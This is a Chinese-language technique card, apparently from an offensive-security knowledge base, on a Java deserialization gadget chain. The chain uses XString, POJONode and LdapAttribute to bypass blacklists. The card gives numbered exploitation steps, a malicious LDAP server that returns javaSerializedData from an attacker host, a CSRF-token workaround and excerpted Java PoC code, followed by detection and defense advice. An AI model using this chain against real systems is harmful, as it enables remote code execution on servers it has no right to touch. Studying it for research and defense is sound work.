---
id: web-java-deser-xstring-pojonode-ldapattribute-javaserializeddata
title: BAVE 被禁时的 Jackson 触发链：Hashtable 哈希碰撞 + XString.equals→POJONode.toString→LdapAttribute→LDAP javaSerializedData 二次反序列化
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: xstring-pojonode-ldapattribute-ldap-javaserializeddata
aliases:
- Jackson + LdapAttribute + LDAP 绕过
- XString.equals 触发 POJONode
- Hashtable 哈希碰撞 POJONode
- LDAP javaSerializedData 绕过高版本
- Spring Security CSRF 403 反序列化
tags:
- java
- deserialization
- jackson
- pojonode
- xstring
- ldapattribute
- ldap
- jndi
- hashtable
- spring-security
- csrf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V473
  verified_at: '2026-11-10T17:00:02+08:00'
  notes: 已对照原文13668图16-23核对：jackson2.13.5/spring-security环境、Hashtable+双HashMap哈希碰撞(AaAaAa/BBAaBB)、XString.equals→POJONode.toString、_value=LdapAttribute(baseCtxURL/rdn)、LDAP返回javaSerializedData内层Jackson链、Spring Security CSRF导致403需取_csrf，均与原文一致；注意本卡frontmatter id为大写S的javaSerializedData，与staging cards.json的小写id不一致，检索需用实际id；未本机复现
---

## 一句话结论

当黑名单封禁了 `javax.management`（`BadAttributeValueExpException` 不可用）和 `TemplatesImpl` 时，可用 `Hashtable` 的两个哈希碰撞 `HashMap` 键触发 `XString.equals(POJONode)`，让 `POJONode.toString()` 经 Jackson 序列化其 `_value`（`com.sun.jndi.ldap.LdapAttribute`，已设 `baseCtxURL`/`rdn`）调用 `getAttributeDefinition()` → `LdapCtx.c_lookup` 发起 LDAP 请求；LDAP 服务端返回带 `javaSerializedData` 的条目，目标反序列化内层原生 Jackson 链（POJONode+TemplatesImpl）执行字节码。另需注意 Spring Security 默认开启 CSRF，缺 `_csrf` 参数时返回 403 而非 401。

## 原理

- **触发入口**：`Hashtable.readObject → reconstitutionPut` 会对每个 key 计算 hash 并在冲突时调用 `e.key.equals(key)`。把两个 `HashMap` 作为 Hashtable 的 key，且两个 map 内部键为哈希碰撞的 `"AaAaAa"`/`"BBAaBB"`，反序列化时 `HashMap.equals` 遍历条目会对另一 map 调 `get(key)`，从而进入 `XString.equals(POJONode)`。
- **XString.equals**：`com.sun.org.apache.xpath.internal.objects.XString.equals(Object obj2)` 在参数不是 XNodeSet/XNumber 时执行 `str().equals(obj2.toString())`，即调用 `POJONode.toString()`。
- **POJONode.toString**：Jackson 的 `POJONode.toString()` 走 `InternalNodeMapper.nodeToString → ObjectMapper.writeValueAsString`，会序列化其 `_value`；把 `_value` 设为 `LdapAttribute`，Jackson 的 Bean 序列化会遍历 getter/字段，触发 `LdapAttribute.getAttributeDefinition()`。
- **LdapAttribute sink**：`getAttributeDefinition()` → `getSchema()` → `LdapCtx.c_lookup`，按 `baseCtxURL` 发起 LDAP 查询；`rdn = new CompositeName("a//b")` 保证进入中间节点解析。攻击者 LDAP 服务返回的条目带 `javaSerializedData` 属性时，JNDI 会取该属性并反序列化（受 `com.sun.jndi.ldap.object.trustSerialData` 等限制），从而在高版本 JDK 关闭 codebase 的情况下仍能投递序列化 payload。
- **内层 payload**：`BadAttributeValueExpException(null)` 的 `val` 设为 `POJONode(TemplatesImpl)`，或直接使用 Jackson 原生 Templates 链；该内层流由 LDAP 客户端代码反序列化，黑名单/入口过滤不参与（视 JDK 实现）。
- **生成端细节**：`POJONode._value` 需在序列化前后用反射设置；`BaseJsonNode.writeReplace` 会改变序列化形态，可用 Javassist 删除（只影响生成端）。`javax.management` 被过滤时不能再用 BAVE 触发，这正是 XString 入口的价值。
- **Spring Security CSRF**：Spring Security 默认开启 CSRF，未带 `_csrf` token 的 POST 会返回 403（不是 401）；从登录页 HTML 取 hidden `_csrf` 值一并提交即可。

## 触发条件

- 存在可控原生反序列化入口，黑名单禁用 `javax.management`（BAVE）、`TemplatesImpl`、`fastjson` 等，但未禁 `com.sun.org.apache.xpath.internal.objects.XString`、`com.fasterxml.jackson.databind.node.POJONode`、`com.sun.jndi.ldap.LdapAttribute`、`Hashtable`。
- classpath 有 Jackson 2.13.x（POJONode/InternalNodeMapper）与 JDK 的 Xalan XString、JNDI LDAP 实现。
- 攻击者可搭建 LDAP 服务并让其返回带 `javaSerializedData` 的条目；目标允许 JNDI LDAP 出网。
- 入口若由 Spring Security 保护，需取得或绕过 CSRF token。

## 利用步骤

1. 确认入口黑名单与依赖（Jackson 2.13.5、Spring Security、JDK 版本）；准备 `TemplatesImpl` 字节码或 Jackson 原生链作为内层 payload 并 Base64。
2. 用 Javassist 删除 `BaseJsonNode.writeReplace`，避免生成端序列化形态变化。
3. 构造 `LdapAttribute`（反射/ReflectionFactory），设 `baseCtxURL=ldap://attacker:5555`、`rdn=new CompositeName("a//b")`。
4. 构造 `POJONode("a")`，`XString("a")`；用哈希碰撞键 `"AaAaAa"`/`"BBAaBB"` 构建两个内部 HashMap，分别放入 XString 与 POJONode；再构造两个外层 HashMap，互为对方键值（保证 `equals` 调用到 XString）。
5. 把 `POJONode._value` 反射设为 `LdapAttribute`；把两个外层 map 放入 `Hashtable`，序列化并 Base64。
6. 启动恶意 LDAP 服务（UnboundID InMemoryDirectoryServer），在 `processSearchResult` 中给条目加 `javaClassName` 与 `javaSerializedData`（内层 payload）。
7. 向入口提交 payload；若被 Spring Security 403，先从登录页取 `_csrf` 参数一并提交；LDAP 回连后内层 Jackson 链执行字节码。

## PoC

```java
// 关键对象（节选）
LdapAttribute ldapAttribute = (LdapAttribute) ReflectionFactory.getReflectionFactory()
        .newConstructorForSerialization(LdapAttribute.class,
                BasicAttribute.class.getConstructor(String.class));
setField(ldapAttribute, "baseCtxURL", "ldap://127.0.0.1:5555");
setField(ldapAttribute, "rdn", new CompositeName("a//b"));

POJONode pojoNode = new POJONode("a");
XString xString = new XString("a");
HashMap map1 = new HashMap(); map1.put("AaAaAa", xString); map1.put("BBAaBB", pojoNode);
HashMap map2 = new HashMap(); map2.put("BBAaBB", xString); map2.put("AaAaAa", pojoNode);
Hashtable<HashMap, String> hashtable = new Hashtable<>();
hashtable.put(map1, "1"); hashtable.put(map2, "1");
setField(pojoNode, "_value", ldapAttribute); // 最后再设
String payload = Base64.getEncoder().encodeToString(serialize(hashtable));
```

LDAP 服务端在返回条目中加入 `javaSerializedData` 放入内层 BAVE+POJONode(TemplatesImpl) payload；原文在目标环境成功执行 shell。

## 变体与关联

- 变体：触发入口用 `HotSwappableTargetSource` 包装 XString/POJONode，见 [[web-java-deserialization-blacklist-hotswappable-xstring-pojonode-spring-aop]]。
- 变体：sink 直接用 POJONode→Jackson→TemplatesImpl（无 LDAP），见 [[web-java-deserialization-jdk-xstring-equals-tostring]]、[[web-java-deser-bave-pojonode-signedobject-business-class-readobject-ssrf-filewrite]]。
- 关联：[[web-java-deser-jndi-ldapattribute-getattributedefinition-sink]]（LdapAttribute sink 的通用分析）、[[web-java-deserialization-jndi-oracle-rowset-jdk17-pojo-proxy-rmi]]。
- 边界：JDK 对 LDAP `javaSerializedData` 的信任开关（`trustSerialData`）、JEP290 过滤器、Jackson 版本差异（`writeReplace` 行为）、Spring Security CSRF 都会影响成功率。

## 检测与防御

- 检测：序列化流含 `XString`、`POJONode`、`LdapAttribute`、两个哈希碰撞 `HashMap` 组成的 `Hashtable`；目标向外部 LDAP 端口发起连接；异常栈出现 `LdapCtx.c_lookup`/`getAttributeDefinition`。
- 防御：JEP290 全局过滤器按类白名单；黑名单加入 XString/POJONode/LdapAttribute/Hashtable 组合；关闭 LDAP `javaSerializedData` 信任；限制 JNDI 出网；Spring Security 保持 CSRF 开启并审计异常 403。
- 边界：业务若合法使用 Jackson/JNDI，需要区分正常序列化与恶意 gadget 组合。
